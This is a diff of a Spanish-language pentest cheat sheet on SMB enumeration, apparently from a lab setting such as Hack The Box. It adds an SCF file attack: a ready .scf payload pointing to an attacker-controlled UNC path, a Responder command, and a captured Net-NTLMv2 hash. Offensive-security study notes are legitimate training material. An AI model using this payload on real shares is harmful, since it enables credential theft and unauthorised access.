@@ -63,7 +63,7 @@ netshareenumall
 netsharegetinfo <SHARE-NAME>
 
 ## Download Shared Folders
-smbmap smbmap -H <TARGET-IP> -u 'username' -p 'password' --download '<Path>' # one file
+smbmap -H <TARGET-IP> -u 'username' -p 'password' --download '<Path>' # one file
 
 smbclient //<target-ip>/<shared-foldaer> -N             # Null session
 smbclient //<target-ip>/<shared-foldaer> -U "<username>%password>"
@@ -119,3 +119,32 @@ S-1-22-1-3 Unix User\sys (1)
 S-1-22-1-4 Unix User\sync (1)
 S-1-22-1-5 Unix User\games (1)
 ```
+
+
+
+### SCF File Attacks
+
+Este ataque consta de si tenemos acceso a una carpeta compartida a nivel de red en la que podemos colocar un archivo con extensión .scf malicioso que nos va a permitir generar una conexión desde la máquina en la que se ejecute dicho archivo automáticamente, proveyéndonos el hash Net-NTLMv2 para su posterior crackeo.
+
+{% code title="@some.scf" %}
+```sh
+[Shell]
+Command=2
+IconFile=\\X.X.X.X\share\some.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+{% endcode %}
+
+Activamos el responder:&#x20;
+
+{% code overflow="wrap" %}
+```java
+responder -I tun0 -dw 
+
+[SMB] NTLMv2-SSP Client   : 10.10.10.103
+[SMB] NTLMv2-SSP Username : HTB\amanda
+[SMB] NTLMv2-SSP Hash     : amanda::HTB:88f9e2309575569a:083F2CCE110D8865D30D206CA6845E71:01010000000000008053022A2919DA0133742111E113D434000000000200080048004D004B004A0001001E00570049004E002D003100480050004F0030004A005A005100320034005A0004003400570049004E002D003100480050004F0030004A005A005100320034005A002E0048004D004B004A002E004C004F00430041004C000300140048004D004B004A002E004C004F00430041004C000500140048004D004B004A002E004C004F00430041004C00070008008053022A2919DA01060004000200000008003000300000000000000001000000002000005FFA777B02D96CA2EC88A47091BFDF1D2EEC3BE65A5880CE2FE33FC252D6F8680A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003800000000000000000000000000    
+```
+{% endcode %}
+
